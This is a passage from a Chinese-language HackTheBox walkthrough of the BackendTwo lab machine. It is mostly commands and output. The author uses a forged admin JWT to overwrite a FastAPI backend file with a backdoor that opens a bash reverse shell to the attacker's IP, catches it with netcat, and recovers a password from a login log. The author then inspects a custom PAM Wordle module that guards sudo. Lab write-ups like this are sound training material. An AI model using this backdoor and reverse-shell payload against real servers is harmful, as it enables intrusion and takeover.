class="hljs-string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzQxNTI5LCJpYXQiOjE2NjE2NTAzMjksInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYTdkMWNjY2ItNjEzNC00ZjkxLWExMzUtMzNiNjZhMmQ2NTNiIiwiZGVidWciOnRydWV9.Go5OEgWxQ9S1n6lQkhY474uqNA74u9EOfn35kAJA-J8&#x27;</span><br></code></pre></td></tr></table></figure><p>但写入ssh还是报错，我猜测是ssh目录不存在。那我可能需要通过尝试将代码写入到服务器后端代码文件中，再人为的尝试访问从而达到代码执行的效果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">Crazy:~/HackTheBox$ curl -X <span class="hljs-string">&#x27;GET&#x27;</span> \<br>  <span class="hljs-string">&#x27;http://10.10.11.162/api/v1/admin/file/L2hvbWUvaHRiL2FwcC9hcGkvdjEvZW5kcG9pbnRzL3VzZXIucHk&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;accept: application/json&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzQxNTI5LCJpYXQiOjE2NjE2NTAzMjksInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYTdkMWNjY2ItNjEzNC00ZjkxLWExMzUtMzNiNjZhMmQ2NTNiIiwiZGVidWciOnRydWV9.Go5OEgWxQ9S1n6lQkhY474uqNA74u9EOfn35kAJA-J8&#x27;</span><br>&#123;<span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;from typing import Any, Optional\nfrom uuid import uuid4\nfrom datetime import datetime\n\n\nfrom fastapi import APIRouter, Depends, HTTPException, Query, Request\nfrom fastapi.security import OAuth2PasswordRequestForm\nfrom sqlalchemy.orm import Session\n\nfrom app import crud\nfrom app import schemas\nfrom app.api import deps\nfrom app.models.user import User\nfrom app.core.security import get_password_hash\n\nfrom pydantic import schema\ndef field_schema(field: schemas.user.UserUpdate, **kwargs: Any) -&gt; Any:\n    if field.field_info.extra.get(\&quot;hidden_from_schema\&quot;, False):\n        raise schema.SkipField(f\&quot;&#123;field.name&#125; field is being hidden\&quot;)\n    else:\n        return original_field_schema(field, **kwargs)\n\noriginal_field_schema = schema.field_schema\nschema.field_schema = field_schema\n\nfrom app.core.auth import (\n    authenticate,\n    create_access_token,\n)\n\nrouter = APIRouter()\n\n@router.get(\&quot;/&#123;user_id&#125;\&quot;, status_code=200, response_model=schemas.User)\ndef fetch_user(*, \n    user_id: int, \n    db: Session = Depends(deps.get_db) \n    ) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Fetch a user by ID\n    \&quot;\&quot;\&quot;\n    result = crud.user.get(db=db, id=user_id)\n    return result\n\n\n@router.put(\&quot;/&#123;user_id&#125;/edit\&quot;)\nasync def edit_profile(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.UserUpdate,\n    user_id: int\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Edit the profile of a user\n    \&quot;\&quot;\&quot;\n    u = db.query(User).filter(User.id == token[&#x27;sub&#x27;]).first()\n    if token[&#x27;is_superuser&#x27;] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token[&#x27;sub&#x27;]).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return &#123;\&quot;result\&quot;: \&quot;true\&quot;&#125;\n        else:\n            raise HTTPException(status_code=400, detail=&#123;\&quot;result\&quot;: \&quot;false\&quot;&#125;)\n\n@router.put(\&quot;/&#123;user_id&#125;/password\&quot;)\nasync def edit_password(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.PasswordUpdate,\n    user_id: int\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Update the password of a user\n    \&quot;\&quot;\&quot;\n    u = db.query(User).filter(User.id == token[&#x27;sub&#x27;]).first()\n    if token[&#x27;is_superuser&#x27;] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token[&#x27;sub&#x27;]).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return &#123;\&quot;result\&quot;: \&quot;true\&quot;&#125;\n        else:\n            raise HTTPException(status_code=400, detail=&#123;\&quot;result\&quot;: \&quot;false\&quot;&#125;)\n\n@router.post(\&quot;/login\&quot;)\ndef login(db: Session = Depends(deps.get_db),\n    form_data: OAuth2PasswordRequestForm = Depends()\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Get the JWT for a user with data from OAuth2 request form body.\n    \&quot;\&quot;\&quot;\n    \n    timestamp = datetime.now().strftime(\&quot;%m/%d/%Y, %H:%M:%S\&quot;)\n    user = authenticate(email=form_data.username, password=form_data.password, db=db)\n    if not user:\n        with open(\&quot;auth.log\&quot;, \&quot;a\&quot;) as f:\n            f.write(f\&quot;&#123;timestamp&#125; - Login Failure for &#123;form_data.username&#125;\\n\&quot;)\n        raise HTTPException(status_code=400, detail=\&quot;Incorrect username or password\&quot;)\n    \n    with open(\&quot;auth.log\&quot;, \&quot;a\&quot;) as f:\n            f.write(f\&quot;&#123;timestamp&#125; - Login Success for &#123;form_data.username&#125;\\n\&quot;)\n\n    return &#123;\n        \&quot;access_token\&quot;: create_access_token(sub=user.id, is_superuser=user.is_superuser, guid=user.guid),\n        \&quot;token_type\&quot;: \&quot;bearer\&quot;,\n    &#125;\n\n@router.post(\&quot;/signup\&quot;, status_code=201)\ndef create_user_signup(\n    *,\n    db: Session = Depends(deps.get_db),\n    user_in: schemas.user.UserSignup,\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Create new user without the need to be logged in.\n    \&quot;\&quot;\&quot;\n\n    new_user = schemas.user.UserCreate(**user_in.dict())\n\n    new_user.guid = str(uuid4())\n\n    user = db.query(User).filter(User.email == new_user.email).first()\n    if user:\n        raise HTTPException(\n            status_code=400,\n            detail=\&quot;The user with this username already exists in the system\&quot;,\n        )\n    user = crud.user.create(db=db, obj_in=new_user)\n\n    return user\n&quot;</span>&#125;   <br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">Crazy:~/HackTheBox$ curl http://<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.162</span>/api/v1/admin/file/$(echo -n <span class="hljs-string">&quot;/home/htb/app/api/v1/endpoints/user.py&quot;</span> | base64) -H <span class="hljs-string">&#x27;Content-Type: application/json&#x27;</span> -d <span class="hljs-string">&#x27;&#123;&quot;file&quot;: &quot;from typing import Any, Optional\nfrom uuid import uuid4\nfrom datetime import datetime\n\n\nfrom fastapi import APIRouter, Depends, HTTPException, Query, Request\nfrom fastapi.security import OAuth2PasswordRequestForm\nfrom sqlalchemy.orm import Session\n\nfrom app import crud\nfrom app import schemas\nfrom app.api import deps\nfrom app.models.user import User\nfrom app.core.security import get_password_hash\n\nfrom pydantic import schema\ndef field_schema(field: schemas.user.UserUpdate, **kwargs: Any) -&gt; Any:\n    if field.field_info.extra.get(\&quot;hidden_from_schema\&quot;, False):\n        raise schema.SkipField(f\&quot;&#123;field.name&#125; field is being hidden\&quot;)\n    else:\n        return original_field_schema(field, **kwargs)\n\noriginal_field_schema = schema.field_schema\nschema.field_schema = field_schema\n\nfrom app.core.auth import (\n    authenticate,\n    create_access_token,\n)\n\nrouter = APIRouter()\n\n@router.get(\&quot;/&#123;user_id&#125;\&quot;, status_code=200, response_model=schemas.User)\ndef fetch_user(*, \n    user_id: int, \n    db: Session = Depends(deps.get_db) \n    ) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Fetch a user by ID\n    \&quot;\&quot;\&quot;\n    if user_id == -2222:\n        import os; os.system(&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span>bash -c \<span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.2/1337 0&gt;&amp;1\&quot;&#x27;\&#x27;&#x27;)\n    result = crud.user.get(db=db, id=user_id)\n    return result\n\n\n@router.put(\&quot;/&#123;user_id&#125;/edit\&quot;)\nasync def edit_profile(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.UserUpdate,\n    user_id: int\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Edit the profile of a user\n    \&quot;\&quot;\&quot;\n    u = db.query(User).filter(User.id == token[&#x27;\&#x27;&#x27;sub&#x27;\&#x27;&#x27;]).first()\n    if token[&#x27;\&#x27;&#x27;is_superuser&#x27;\&#x27;&#x27;] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token[&#x27;\&#x27;&#x27;sub&#x27;\&#x27;&#x27;]).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return &#123;\&quot;result\&quot;: \&quot;true\&quot;&#125;\n        else:\n            raise HTTPException(status_code=400, detail=&#123;\&quot;result\&quot;: \&quot;false\&quot;&#125;)\n\n@router.put(\&quot;/&#123;user_id&#125;/password\&quot;)\nasync def edit_password(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.PasswordUpdate,\n    user_id: int\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Update the password of a user\n    \&quot;\&quot;\&quot;\n    u = db.query(User).filter(User.id == token[&#x27;\&#x27;&#x27;sub&#x27;\&#x27;&#x27;]).first()\n    if token[&#x27;\&#x27;&#x27;is_superuser&#x27;\&#x27;&#x27;] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token[&#x27;\&#x27;&#x27;sub&#x27;\&#x27;&#x27;]).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return &#123;\&quot;result\&quot;: \&quot;true\&quot;&#125;\n        else:\n            raise HTTPException(status_code=400, detail=&#123;\&quot;result\&quot;: \&quot;false\&quot;&#125;)\n\n@router.post(\&quot;/login\&quot;)\ndef login(db: Session = Depends(deps.get_db),\n    form_data: OAuth2PasswordRequestForm = Depends()\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Get the JWT for a user with data from OAuth2 request form body.\n    \&quot;\&quot;\&quot;\n    \n    timestamp = datetime.now().strftime(\&quot;%m/%d/%Y, %H:%M:%S\&quot;)\n    user = authenticate(email=form_data.username, password=form_data.password, db=db)\n    if not user:\n        with open(\&quot;auth.log\&quot;, \&quot;a\&quot;) as f:\n            f.write(f\&quot;&#123;timestamp&#125; - Login Failure for &#123;form_data.username&#125;\\n\&quot;)\n        raise HTTPException(status_code=400, detail=\&quot;Incorrect username or password\&quot;)\n    \n    with open(\&quot;auth.log\&quot;, \&quot;a\&quot;) as f:\n            f.write(f\&quot;&#123;timestamp&#125; - Login Success for &#123;form_data.username&#125;\\n\&quot;)\n\n    return &#123;\n        \&quot;access_token\&quot;: create_access_token(sub=user.id, is_superuser=user.is_superuser, guid=user.guid),\n        \&quot;token_type\&quot;: \&quot;bearer\&quot;,\n    &#125;\n\n@router.post(\&quot;/signup\&quot;, status_code=201)\ndef create_user_signup(\n    *,\n    db: Session = Depends(deps.get_db),\n    user_in: schemas.user.UserSignup,\n) -&gt; Any:\n    \&quot;\&quot;\&quot;\n    Create new user without the need to be logged in.\n    \&quot;\&quot;\&quot;\n\n    new_user = schemas.user.UserCreate(**user_in.dict())\n\n    new_user.guid = str(uuid4())\n\n    user = db.query(User).filter(User.email == new_user.email).first()\n    if user:\n        raise HTTPException(\n            status_code=400,\n            detail=\&quot;The user with this username already exists in the system\&quot;,\n        )\n    user = crud.user.create(db=db, obj_in=new_user)\n\n    return user\n\n&quot;</span>&#125;<span class="hljs-string">&#x27; -H &#x27;</span>Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzQxNTI5LCJpYXQiOjE2NjE2NTAzMjksInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYTdkMWNjY2ItNjEzNC00ZjkxLWExMzUtMzNiNjZhMmQ2NTNiIiwiZGVidWciOnRydWV9.Go5OEgWxQ9S1n6lQkhY474uqNA74u9EOfn35kAJA-J8<span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#123;&quot;result&quot;:&quot;success&quot;&#125;   </span><br><span class="hljs-string">Crazy:~/HackTheBox$ curl http://10.10.11.162/api/v1/user/-2222</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">Crazy:~/HackTheBox$ nc -lvnp <span class="hljs-number">1337</span><br>listening on [<span class="hljs-built_in">any</span>] <span class="hljs-number">1337</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.2</span>] <span class="hljs-keyword">from</span> (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.162</span>] <span class="hljs-number">51872</span><br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (<span class="hljs-number">681</span>): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>To run a command <span class="hljs-keyword">as</span> administrator (user <span class="hljs-string">&quot;root&quot;</span>), use <span class="hljs-string">&quot;sudo &lt;command&gt;&quot;</span>.<br>See <span class="hljs-string">&quot;man sudo_root&quot;</span> <span class="hljs-keyword">for</span> details.<br><br>htb@BackendTwo:~$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=<span class="hljs-number">1000</span>(htb) gid=<span class="hljs-number">1000</span>(htb) groups=<span class="hljs-number">1000</span>(htb),<span class="hljs-number">4</span>(adm),<span class="hljs-number">24</span>(cdrom),<span class="hljs-number">27</span>(sudo),<span class="hljs-number">30</span>(dip),<span class="hljs-number">46</span>(plugdev),<span class="hljs-number">116</span>(lxd)<br>htb@BackendTwo:~$ <br></code></pre></td></tr></table></figure><p>还是老样子，留了个密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">htb@BackendTwo:~$ <span class="hljs-built_in">cat</span> auth.log <br>08/27/2022, 23:27:50 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 23:31:10 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 23:44:30 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 23:47:50 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 23:52:50 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/27/2022, 23:56:10 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 00:09:30 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 00:17:50 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 00:19:30 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 00:26:10 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 00:34:30 - Login Failure <span class="hljs-keyword">for</span> 1qaz2wsx_htb!<br>08/28/2022, 00:36:05 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 00:36:10 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 00:36:30 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 00:37:50 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 00:42:50 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 00:49:30 - Login Success <span class="hljs-keyword">for</span> admin@htb.local<br>08/28/2022, 01:08:19 - Login Failure <span class="hljs-keyword">for</span> crazy@inside.htb<br>08/28/2022, 01:08:45 - Login Success <span class="hljs-keyword">for</span> crazy@inside.htb<br>08/28/2022, 01:29:45 - Login Success <span class="hljs-keyword">for</span> crazy@inside.htb<br>08/28/2022, 01:32:08 - Login Success <span class="hljs-keyword">for</span> crazy@inside.htb<br></code></pre></td></tr></table></figure><p>但是这次不能切换root.它是htb的密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ ssh htb@10.10.11.162                                             <br>The authenticity of host <span class="hljs-string">&#x27;10.10.11.162 (10.10.11.162)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:hE6H4DrsHebfs+gclhz9SL77tMpy8aKR3vp8Y0NRDvY.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.11.162<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">htb@10.10.11.162&#x27;</span>s password: <br>Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-77-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>0 updates can be applied immediately.<br><br><br>The list of available updates is more than a week old.<br>To check <span class="hljs-keyword">for</span> new updates run: sudo apt update<br><br>To run a <span class="hljs-built_in">command</span> as administrator (user <span class="hljs-string">&quot;root&quot;</span>), use <span class="hljs-string">&quot;sudo &lt;command&gt;&quot;</span>.<br>See <span class="hljs-string">&quot;man sudo_root&quot;</span> <span class="hljs-keyword">for</span> details.<br><br>htb@BackendTwo:~$ <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">htb@BackendTwo:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> htb: <br>--- Welcome to PAM-Wordle! ---<br><br>A five character [a-z] word has been selected.<br>You have 6 attempts to guess the word.<br><br>After each guess you will recieve a hint <span class="hljs-built_in">which</span> indicates:<br>? - what letters are wrong.<br>* - what letters are <span class="hljs-keyword">in</span> the wrong spot.<br>[a-z] - what letters are correct.<br><br>--- Attempt 1 of 6 ---<br>Word: <br></code></pre></td></tr></table></figure><p>还要玩猜字游戏。&#x2F;etc&#x2F;pam.d是包含各种自定义模块的目录，里边有一个sudo的配置文件，可以详细的看到sudo 定义关联了哪些：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">htb@BackendTwo:~$ <span class="hljs-built_in">cd</span> /etc/pam.d<br>htb@BackendTwo:/etc/pam.d$ <span class="hljs-built_in">ls</span><br>atd             common-password                other      su<br>chfn            common-session                 passwd     su-l<br>chpasswd        common-session-noninteractive  polkit-1   sudo<br>chsh            cron                           runuser    systemd-user<br>common-account  login                          runuser-l  vmtoolsd<br>common-auth     newusers                       sshd<br>htb@BackendTwo:/etc/pam.d$ <span class="hljs-built_in">cat</span> sudo<br><span class="hljs-comment">#%PAM-1.0</span><br><br>session    required   pam_env.so readenv=1 user_readenv=0<br>session    required   pam_env.so readenv=1 envfile=/etc/default/locale user_readenv=0<br>auth    required pam_unix.so<br>auth    required    pam_wordle.so<br>@include common-auth<br>@include common-account<br>@include common-session-noninteractive<br>htb@BackendTwo:/etc/pam.d$ <br></code></pre></td></tr></table></figure><p>pam_wordle.so看起来像是游戏的答案校验，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs bash">htb@BackendTwo:~$ find / -name pam_wordle.so 2&gt;/dev/null<br>/usr/lib/x86_64-linux-gnu/security/pam_wordle.so<br>htb@BackendTwo:~$ strings /usr/lib/x86_64-linux-gnu/security/pam_wordle.so<br>Q`^B<br>DICT<br>fetch_word<br>regcomp<br>fopen<br>strlen<br>regexec<br>fgets<br>fclose<br>check_word<br>strncmp<br>wordle_guess<br>pam_prompt<br>pam_sm_authenticate<br>time<br>srand<br>pam_sm_setcred<br>pam_sm_acct_mgmt<br>AWAVAUATSH<br>[A\A]A^A_]<br>linu<br>^[abcdefghijklmnopqrstuvwxyz]&#123;5&#125;$<br>Word: <br>Invalid guess: unknown word.<br>Warning: error reading dictionary.<br>Invalid guess: guess length != word length.<br>Correct!<br>Hint-&gt;%s<br>--- Welcome to PAM-Wordle! ---<br>A five character [a-z] word has been selected.<br>You have %d attempts to guess the word.<br>After each guess you will recieve a hint <span class="hljs-built_in">which</span> indicates:<br>? - what letters are wrong.<br>* - what letters are <span class="hljs-keyword">in</span> the wrong spot.<br>[a-z] - what letters are correct.<br>--- Attempt %d of %d ---<br>You lose.<br>The word was: %s<br>;*3$<span class="hljs-string">&quot;</span><br><span class="hljs-string">/opt/.words</span><br><span class="hljs-string">GCC: (Debian 10.2.1-6) 10.2.1 20210110</span><br><span class="hljs-string">_DYNAMIC</span><br><span class="hljs-string">_GLOBAL_OFFSET_TABLE_</span><br><span class="hljs-string">fgets</span><br><span class="hljs-string">fetch_word</span><br><span class="hljs-string">strncmp</span><br><span class="hljs-string">check_word</span><br><span class="hljs-string">regcomp</span><br><span class="hljs-string">fopen</span><br><span class="hljs-string">srand</span><br><span class="hljs-string">fclose</span><br><span class="hljs-string">regexec</span><br><span class="hljs-string">time</span><br><span class="hljs-string">wordle_guess</span><br><span class="hljs-string">DICT</span><br><span class="hljs-string">pam_sm_setcred</span><br><span class="hljs-string">strlen</span><br><span class="hljs-string">pam_sm_authenticate</span><br><span class="hljs-string">pam_sm_acct_mgmt</span><br><span class="hljs-string">pam_prompt</span><br><span class="hljs-string">.symtab</span><br><span class="hljs-string">.strtab</span><br><span class="hljs-string">.shstrtab</span><br><span class="hljs-string">.gnu.hash</span><br><span class="hljs-string">.dynsym</span><br><span class="hljs-string">.dynstr</span><br><span class="hljs-string">.rela.dyn</span><br><span class="hljs-string">.rela.plt</span><br><span class="hljs-string">.text</span><br><span class="hljs-string">.rodata</span><br><span class="hljs-string">.eh_frame</span><br><span class="hljs-string">.dynamic</span><br><span class="hljs-string">.got</span><br><span class="hljs-string">.got.plt</span><br><span class="hljs-string">.data</span><br><span class="hljs-string">.comment</span><br><span class="hljs-string">htb@BackendTwo:~$ </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs bash">htb@BackendTwo:/opt$ <span class="hljs-built_in">cat</span> .words <br>write<br>close<br>fstat<br>lstat<br>lseek<br>ioctl<br>readv<br>msync<br>shmat<br>pause<br>alarm<br><span class="hljs-built_in">clone</span><br>vfork<br>wait4<br><span class="hljs-built_in">uname</span><br>semop<br>shmdt<br>fcntl<br>flock<br>fsync<br><span class="hljs-built_in">chdir</span><br><span class="hljs-built_in">mkdir</span><br><span class="hljs-built_in">rmdir</span><br>creat<br><span class="hljs-built_in">chmod</span><br><span class="hljs-built_in">chown</span><br><span class="hljs-built_in">umask</span><br><span class="hljs-built_in">times</span><br>utime<br><span class="hljs-built_in">mknod</span><br>ustat<br>sysfs<br>mlock<br>prctl<br>mount<br>tkill<br>futex<br>mbind<br>ppoll<br>pipe2<br>setns<br>rocku<br>odays<br>mysql<br>hacks<br>cheat<br>crypt<br>virus<br>hydra<br>creds<br>cmake<br>ipsec<br>javac<br>leaks<br>locks<br>linux<br>login<br>nginx<br>ngrok<br>nikto<br>patch<br>pgsql<br>posix<br>proxy<br>putty<br>quake<br>samba<br>wfuzz<br>wheel<br>opsec<br>shell<br>worms<br>union<br>blind<br>htb@BackendTwo:/opt$ 